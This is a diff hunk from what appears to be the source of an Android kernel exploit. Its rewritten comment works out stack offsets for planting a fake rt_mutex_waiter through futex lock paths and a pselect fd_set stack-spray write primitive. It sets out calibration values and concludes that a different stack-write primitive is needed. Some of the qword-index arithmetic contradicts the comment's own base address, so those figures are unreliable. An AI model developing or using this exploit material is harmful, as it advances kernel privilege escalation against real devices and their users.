@@ -53,24 +53,27 @@
 #define SLIDE_TRACEFS_EVENT_ID 109
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0014a120ULL
 /*
- * A06 geometry (verified from multiple kernel crash dumps):
+ * A06 geometry (DERIVED from vmlinux.elf disassembly + crash dumps):
  *   core_sys_select() only copies fd_sets onto the kernel stack while
  *   FDS_BYTES(n) <= SELECT_STACK_ALLOC/6 = 256/6 = 42 bytes per set
  *   (android15-6.6 include/linux/poll.h FRONTEND_STACK_ALLOC=256).
  *   nfds=320 gives 40 B/set -> 5 qwords/set -> 15 qwords total on stack,
- *   base 0x3c20.  Any nfds >= 321 falls back to kvmalloc and never touches
- *   the thread stack, so the fake waiter NEVER lands (verified: nfds=576
- *   crashes with 0x3c80..0x3ce0 all zeros).
+ *   base stack+0x3c20.  Any nfds >= 321 falls back to kvmalloc and never
+ *   touches the thread stack (verified: nfds=576 crashes all-zero).
  *
- * With nfds=320 only global qwords 0..14 are reachable.  The original
- * FUTEX_WAIT_REQUEUE_PI path places the rt_mutex_waiter at stack+0x3c80
- * (= G12), so its ->lock at +0x58 = 0x3cd8 = G23 is UNREACHABLE.
- * Direct FUTEX_LOCK_PI (SLIDE_DIRECT_LOCK_PI) drops the requeue frames and
- * puts the waiter a few qwords shallower; the assumed base is ~0x3c38
- * (G3), putting word0..word11 (lock at +0x58) at G3..G14, all inside the
- * window.  Keep SHIFT runtime-overridable (env SLIDE_PSELECT_WORD_SHIFT)
- * for on-device calibration; the guard disables the writer unless the
- * fake's lock slot is reachable.
+ *   futex waiter base (hardware anchor):
+ *     futex_wait_requeue_pi: sub sp,0x1c0 ; waiter at sp+0x90
+ *     futex_lock_pi        : sub sp,0x1a0 ; waiter at sp+0x70
+ *     both from do_futex (sub sp,0x60), so BOTH resolve to the SAME
+ *     absolute stack+0x3c80 (verified by crashes #3/#5/#6/#7/#8 x25).
+ *
+ *   ->lock is at +0x38 (compact) / +0x58 (non-compact) = 0x3cb8/0x3cd8
+ *   = global index G24/G30, both beyond the Gmax=14 on-stack window.
+ *   CONCLUSION: the pselect fd_set stack-copy primitive cannot overlap the
+ *   walked waiter's lock on this kernel via EITHER futex path.  The
+ *   writer must use a different stack-write primitive (MCAST/SIGRETURN)
+ *   that can reach stack+0x3c80+0x38/0x58.  The glow pselect writer is
+ *   kept only as a diagnostic harness; the guard below prevents panics.
  */
 #define SLIDE_PSELECT_NFDS 320
 #define SLIDE_PSELECT_WORD_SHIFT 3
